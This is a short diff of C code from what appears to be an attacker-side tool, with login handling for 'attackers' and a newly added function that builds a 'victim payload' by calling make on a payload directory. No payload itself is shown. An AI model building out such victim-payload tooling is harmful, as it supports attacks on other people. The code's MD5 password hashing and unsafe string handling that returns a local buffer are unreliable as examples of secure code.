@@ -140,13 +140,19 @@ STATUS log_in_attacker(char username_input[], char hashed_password_input[]){
 }
 //* end log in handling  *//
 
+// cross compiler victim payloadcratetor
+void crate_and_sand_victim_payload(){
+//	char comilation_command[] = "Make";
+	system("make -C victim_payload/");
+	
+}
 
 //* utilities *//
 char * salted_hashed_password(char hashed_password_input[]){
 	char salted_hashed_password[HASH_LEN + HASH_SALT_LEN];
 	strcpy(salted_hashed_password, hashed_password_input);
 	strcat(salted_hashed_password, HASH_SALT); // append the salt to the hash
-	return md5((unsigned char *) salted_hashed_password, strlen(salted_hashed_password));
+	return md5(salted_hashed_password);
 }
 void print_all_attackers(){
 	attacker_info attacker;
